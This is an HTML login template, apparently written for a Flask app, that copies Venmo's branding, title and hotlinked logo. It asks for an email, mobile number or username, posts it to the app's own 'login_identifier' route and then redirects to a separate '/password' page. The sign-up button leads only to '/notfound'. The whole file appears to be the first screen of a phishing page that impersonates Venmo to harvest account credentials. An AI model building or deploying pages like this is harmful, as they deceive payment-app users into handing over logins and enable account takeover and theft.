<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Venmo | Login</title>

  <!-- Favicon -->
  <link rel="icon" type="image/png" href="/venmo.jpg">

  <style>
    :root {
      --accent: #0087ff;
      --accent-deep: #006fe0;
      --muted: #6b7280;
      --bg: #fafbfd;
      --input-bg: #ffffff;
    }

    * { box-sizing: border-box; }
    html, body {
      height: 100%;
      margin: 0;
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    }
    body {
      display: flex;
      align-items: center;
      justify-content: center;
      background: var(--bg);
      padding: 20px;
    }

    /* Card */
    .card {
      width: 100%;
      max-width: 420px; /* narrower for better fit on phones */
      background: var(--bg);
      border-radius: 10px;
      padding: 32px 28px;
      box-shadow: 0 8px 26px rgba(16,24,40,0.06);
      border: 3px solid rgba(0, 3, 7, 0.04);
    }

    /* Logo area */
    .logo-wrap { 
      display: flex; 
      justify-content: center;
      margin-bottom: 20px;
    }
    .logo-wrap img {
      width: 70px; 
      height: auto;
    }

    h1 {
      font-size: 22px;
      margin-top: 20px;
      margin-bottom: 24px;
      line-height: 28px;
      text-align: center;
      font-weight: 500;
      color: #2F3033;
    }

    .helper { 
      color: var(--muted); 
      text-align: center; 
      margin: 0 0 16px; 
    }

    form {
      display: flex; 
      flex-direction: column; 
      gap: 16px; 
    }

    /* Input */
    .form-group { position: relative; }
    .input {
      width: 100%;
      padding: 18px 14px 14px 14px;
      border-radius: 8px;
      border: 2px solid #7e8aa3;
      font-size: 16px;
      background: var(--input-bg);
      outline: none;
      height: 54px;
      transition: border-color .15s ease, box-shadow .15s ease;
    }
    .input:hover { color: #006fe0; }
    .input:focus { 
      box-shadow: 0 0 0 6px rgba(0,135,255,0.06); 
      border-color: var(--accent-deep); 
    }

    /* Floating label */
    .floating-label {
      position: absolute;
      left: 14px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 15px;
      color: var(--muted);
      pointer-events: none;
      transition: all 0.16s cubic-bezier(.2,.9,.2,1);
      background: transparent;
      padding: 0 6px;
    }

    .input:focus + .floating-label,
    .input:not(:placeholder-shown) + .floating-label {
      top: 8px;
      font-size: 12px;
      color: var(--accent);
      background: var(--input-bg);
    }

    /* Buttons */
    .btn-row { 
      display: flex; 
      flex-direction: column; 
      gap: 18px; 
      margin-top: 10px;
    }
    .btn-primary {
      padding: 14px;
      border-radius: 28px;
      background: linear-gradient(180deg, var(--accent) 0%, var(--accent-deep) 100%);
      border: none; 
      color: white; 
      font-weight: 700; 
      font-size: 15px; 
      cursor: pointer;
      box-shadow: 0 4px 8px rgba(0,135,255,0.14);
    }
    .btn-secondary {
      padding: 14px;
      border-radius: 28px;
      border: 1px solid var(--accent);
      background: transparent; 
      color: var(--accent); 
      font-weight: 700; 
      font-size: 15px;
      cursor: pointer;
    }

    .small { 
      font-size: 13px; 
      color: var(--muted); 
      text-align: center; 
      margin-top: 10px; 
    }

    /* --- Responsive Tweaks --- */

    @media (max-width: 480px) { /* phones */
      .card {
        padding: 20px;
      }
      h1 { font-size: 20px; }
      .logo-wrap img { width: 60px; }
      .input { font-size: 15px; height: 50px; }
    }

    @media (min-width: 768px) and (max-width: 1024px) { /* iPads/tablets */
      .card {
        max-width: 500px;
        padding: 36px;
      }
      h1 { font-size: 24px; }
      .input { font-size: 17px; }
    }
  </style>
</head>
<body>
  <main class="card" role="main" aria-labelledby="pageTitle">
    <div class="logo-wrap">
      <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/venmo-color.svg" alt="Venmo logo" />
    </div>

    <h1 id="pageTitle">Log in</h1>

    <form method="POST" action="{{ url_for('login_identifier') }}" autocomplete="on">
      <div class="form-group">
        <input id="identifier" class="input" type="text" name="identifier"
              placeholder=" " inputmode="email" required />
        <label for="identifier" class="floating-label">Enter email, mobile, or username</label>
      </div>

      <div class="btn-row">
        <button type="submit" class="btn-primary">Next</button>
        <button type="button" class="btn-secondary" onclick="onSignup()">Sign up</button>
      </div>
    </form>

  </main>

<script>
  function onNext() {
    const v = document.getElementById('identifier').value.trim();
    if (!v) {
      alert('Please enter your email, mobile, or username.');
      return;
    }
    // âœ… Redirect to password page
    window.location.href = "/password";  
  }

  function onSignup() {
    window.location.href = "/notfound"; // or wherever you want sign-up to go
  }
</script>

</body>
</html>
